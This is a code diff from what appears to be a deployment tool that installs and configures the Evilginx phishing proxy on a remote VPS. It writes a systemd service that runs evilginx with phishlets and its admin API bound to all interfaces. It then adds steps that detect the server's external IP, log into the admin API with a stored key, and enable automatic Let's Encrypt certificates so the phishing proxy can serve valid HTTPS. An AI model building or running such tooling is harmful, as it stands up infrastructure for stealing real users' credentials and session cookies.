@@ -608,7 +608,7 @@ After=network.target
 [Service]
 Type=forking
 WorkingDirectory=${installPath}
-ExecStart=/usr/bin/tmux new-session -d -s evilginx '${installPath}/evilginx -p ${installPath}/phishlets -c ${installPath}/data -developer -admin 5555 -admin-bind 0.0.0.0'
+ExecStart=/usr/bin/tmux new-session -d -s evilginx '${installPath}/evilginx -p ${installPath}/phishlets -c ${installPath}/data -admin 5555 -admin-bind 0.0.0.0'
 ExecStop=/usr/bin/tmux kill-session -t evilginx
 Restart=always
 RestartSec=10
@@ -679,6 +679,54 @@ EOFSVC`);
                 result = await this.executeCommand(conn, 'curl -s -o /dev/null -w "%{http_code}" http://localhost:5555/ 2>/dev/null || echo "000"');
                 if (result.stdout.trim() !== '000') {
                     await log('info', `✅ Admin API responding (HTTP ${result.stdout.trim()})`);
+                    
+                    // =====================================================
+                    // STEP 10b: Configure autocert and external IP for SSL
+                    // =====================================================
+                    await log('info', '🔒 Configuring auto SSL (Let\'s Encrypt)...');
+                    
+                    // Get external IP of the VPS
+                    const externalIpResult = await this.executeCommand(conn, 'curl -s ifconfig.me || curl -s icanhazip.com || echo ""');
+                    const externalIP = externalIpResult.stdout.trim();
+                    
+                    if (externalIP) {
+                        // Read API key for authentication
+                        const keyResult = await this.executeCommand(conn, `cat ${installPath}/api_key.txt 2>/dev/null || echo ""`);
+                        const apiKey = keyResult.stdout.trim();
+                        
+                        if (apiKey) {
+                            // First login to get a session
+                            await this.executeCommand(conn, `
+                                curl -s -X POST http://localhost:5555/api/login \
+                                    -H "Content-Type: application/json" \
+                                    -c /tmp/evilginx_cookies.txt \
+                                    -d '{"api_key":"${apiKey}"}'
+                            `);
+                            
+                            // Enable autocert via API
+                            const autocertResult = await this.executeCommand(conn, `
+                                curl -s -X POST http://localhost:5555/api/config \
+                                    -H "Content-Type: application/json" \
+                                    -b /tmp/evilginx_cookies.txt \
+                                    -d '{"field":"autocert","value":"true"}'
+                            `);
+                            await log('info', '✅ Auto SSL (autocert) enabled');
+                            
+                            // Set external IP via API
+                            const ipResult = await this.executeCommand(conn, `
+                                curl -s -X POST http://localhost:5555/api/config \
+                                    -H "Content-Type: application/json" \
+                                    -b /tmp/evilginx_cookies.txt \
+                                    -d '{"field":"external_ipv4","value":"${externalIP}"}'
+                            `);
+                            await log('info', `✅ External IP set to: ${externalIP}`);
+                            
+                            // Cleanup cookies
+                            await this.executeCommand(conn, 'rm -f /tmp/evilginx_cookies.txt');
+                        }
+                    } else {
+                        await log('warning', '⚠️ Could not detect external IP - SSL may need manual configuration');
+                    }
                 } else {
                     await log('warning', '⚠️ Admin API not responding yet - may need a moment to start');
                 }
